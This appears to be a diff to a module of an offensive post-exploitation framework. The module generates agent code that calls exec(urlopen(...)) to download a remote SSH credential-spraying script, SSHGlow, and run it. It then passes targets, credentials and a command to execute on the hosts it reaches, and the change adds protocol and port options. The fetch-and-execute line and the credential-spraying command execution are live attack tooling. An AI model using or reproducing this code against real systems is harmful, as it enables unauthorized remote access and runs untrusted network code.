@@ -13,7 +13,9 @@ class Module(object):
     @staticmethod
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         targets = params['Targets']
+        proto = params['Proto']
         creds = params['Creds']
+        port = params['Port']
         delay = params['Delay']
         noDuplicate = 'True' if params['noDuplicate'].lower() == 'true' else 'False'
         command = params['Command']
@@ -77,10 +79,10 @@ class Module(object):
             import urllib
             from urllib.request import urlopen
             try:
-                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"),globals())
-                run("{targets}","{creds}",delay={delay},no_duplicate={noDuplicate},cmd="{cmd}")
+                exec(urlopen("https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py").read().decode("utf-8"), globals())
+                run("{targets}", get_proto("{proto}", {port}), "{creds}", delay={delay}, no_duplicate={noDuplicate}, cmd="{cmd}")
             except urllib.error.URLError:
                 print("\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow")
-            except Exception as e:
-                print("\033[0;31m[!]\033[0;37m Error occured -> ",e)
+            except BaseException as e:
+                print("\033[0;31m[!]\033[0;37m Error occured -> ", e)
         """.replace('            ','')
